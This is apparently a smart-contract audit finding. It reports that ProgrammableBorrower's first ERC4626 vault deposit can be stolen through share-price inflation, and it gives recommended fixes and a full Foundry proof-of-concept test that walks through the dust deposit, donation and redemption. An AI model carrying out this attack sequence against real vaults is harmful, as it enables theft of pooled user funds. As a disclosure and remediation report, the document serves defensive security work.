### Title
ProgrammableBorrower’s first ERC4626 deposit can be emptied by share-price inflation - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower` accepts any configured ERC4626 vault that reports the correct asset, but does not require existing liquidity, enforce a minimum share mint, or compare the received share value with the deposited amount. [1](#0-0) [2](#0-1) 

An unprivileged user of the configured vault can inflate its share price before the first `onStartEpoch` deposit by making a dust deposit and donating underlying directly to the vault. `ProgrammableBorrower` then records the pre-deposit balance as epoch principal while accepting zero or dust vault shares, leaving pool assets redeemable by the attacker. [3](#0-2) 

### Finding Description
`initialize` validates only that `vault.asset()` equals the CDO underlying token; it does not validate vault supply, liquidity, share price, or the vault implementation. [4](#0-3) 

During `onStartEpoch`, the contract snapshots `underlyingToken.balanceOf(address(this)) + currentVaultAssets` before depositing all available cash, and then stores that amount in `epochStartVaultAssets`. [5](#0-4) 

`_depositToVault` calls `vault.deposit(_assetAmount, address(this))` and emits the returned `shares`, but never checks that `shares > 0` or that `convertToAssets(shares)` approximates `_assetAmount`. [2](#0-1) 

Consequently, an attacker can seed an empty or nearly empty vault with one share and inflate its asset-per-share ratio through a direct underlying donation. When the first epoch deposit executes, standard ERC4626 integer division can mint zero shares to `ProgrammableBorrower` while the attacker retains the only share and redeems the vault’s entire balance.

### Impact Explanation
For a pool deposit `A`, the attacker deposits one wei to mint one share and donates at least `A` underlying. If the vault mints `A * 1 / (A + 1) == 0` shares to `ProgrammableBorrower`, the attacker can redeem one share for approximately `2A + 1`, recovering the donation and extracting the pool’s `A` deposit.

`epochStartVaultAssets` still records `A`, while `_currentVaultAssets()` returns zero because `ProgrammableBorrower` owns no shares. [6](#0-5)  At pool closure, `onStopEpoch` sees that the requested shortfall exceeds the vault position, returns success, and the CDO’s subsequent `transferFrom` fails because the programmable borrower has no underlying balance. [7](#0-6) [8](#0-7) 

The result is direct theft of the initial pool deposit, followed by borrower-default accounting and permanent loss for tranche holders.

### Likelihood Explanation
The attack requires the configured ERC4626 vault to have empty or sufficiently low liquidity and an implementation vulnerable to first-depositor/share-price inflation. Such vaults remain possible because configuration checks only the underlying asset and does not require a minimum initialized liquidity reserve. [1](#0-0) 

The attacker does not need a privileged role: depositing into and donating underlying to a public ERC4626 vault are ordinary unprivileged operations. Front-running or pre-positioning is possible while the pool is idle because `ProgrammableBorrower` deposits its entire cash balance only when `startEpoch` invokes `onStartEpoch`. [9](#0-8) [10](#0-9) 

Likelihood is therefore dependent on vault selection and current vault supply, but the vulnerable code contains no preventive invariant when a suitable vault is configured.

### Recommendation
In `_depositToVault`, require `shares != 0` and validate `vault.convertToAssets(shares)` within a bounded slippage of `_assetAmount`. [2](#0-1) 

Alternatively, use `mint` with a minimum acceptable asset contribution, maintain a permissioned list of audited vaults with initialized liquidity, or require a minimum vault total supply and total asset value during `initialize` and `setVault`. [11](#0-10) 

The validation should also be repeated after deposits because a previously healthy vault can become illiquid or economically manipulated between epochs.

### Proof of Concept
The following Foundry fork test uses mainnet USDC and an ERC4626 vault with the conventional first-deposit conversion formula. The fake CDO is only a caller adapter because `onStartEpoch` is restricted to the configured `idleCDO` address. [12](#0-11)

pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol";
import "openzeppelin-contracts/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import "../contracts/strategies/idle/ProgrammableBorrower.sol";

contract InflatableVault is ERC20 {
    using SafeERC20 for IERC20;

    IERC20 public immutable assetToken;

    constructor(address asset_) ERC20("Vault", "v") {
        assetToken = IERC20(asset_);
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0 ? shares : shares * assetToken.balanceOf(address(this)) / supply;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        uint256 assetsBefore = assetToken.balanceOf(address(this));
        uint256 supply = totalSupply();
        shares = supply == 0 || assetsBefore == 0 ? assets : assets * supply / assetsBefore;
        assetToken.safeTransferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function withdraw(uint256 assets, address receiver, address owner)
        external
        returns (uint256 shares)
    {
        shares = assets * totalSupply() / assetToken.balanceOf(address(this));
        if (shares * assetToken.balanceOf(address(this)) < assets * totalSupply()) {
            shares++;
        }
        _burn(owner, shares);
        assetToken.safeTransfer(receiver, assets);
    }

    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        assets = convertToAssets(shares);
        _burn(owner, shares);
        assetToken.safeTransfer(receiver, assets);
    }
}

contract FakeIdleCDO {
    address public immutable token;
    constructor(address token_) { token = token_; }
}

contract ProgrammableBorrowerInflationForkTest is Test {
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    function testFirstDepositInflationStealsEpochPrincipal() external {
        uint256 poolDeposit = 10_000e6;
        address attacker = makeAddr("attacker");

        InflatableVault vault = new InflatableVault(USDC);
        FakeIdleCDO cdo = new FakeIdleCDO(USDC);

        ProgrammableBorrower implementation = new ProgrammableBorrower();
        ProgrammableBorrower borrower = ProgrammableBorrower(
            address(
                new TransparentUpgradeableProxy(
                    address(implementation),
                    address(this),
                    abi.encodeWithSelector(
                        ProgrammableBorrower.initialize.selector,
                        address(vault),
                        address(cdo),
                        address(this),
                        address(this),
                        makeAddr("realBorrower"),
                        0
                    )
                )
            )
        );

        deal(USDC, attacker, poolDeposit + 1);
        vm.startPrank(attacker);
        IERC20(USDC).approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker);
        IERC20(USDC).transfer(address(vault), poolDeposit);
        vm.stopPrank();

        deal(USDC, address(borrower), poolDeposit);

        vm.prank(address(cdo));
        borrower.onStartEpoch(0);

        assertEq(vault.balanceOf(address(borrower)), 0);
        assertEq(borrower.epochStartVaultAssets(), poolDeposit);
        assertEq(borrower.totalUnderlying(), 0);

        vm.prank(attacker);
        uint256 stolen = vault.redeem(1, attacker, attacker);

        assertEq(stolen, (poolDeposit * 2) + 1);
        assertEq(IERC20(USDC).balanceOf(attacker), (poolDeposit * 2) + 1);

        vm.prank(address(cdo));
        bool hookResult = borrower.onStopEpoch(poolDeposit, true);
        assertTrue(hookResult);

        vm.expectRevert();
        vm.prank(address(cdo));
        IERC20(USDC).transferFrom(address(borrower), address(cdo), poolDeposit);
    }
}
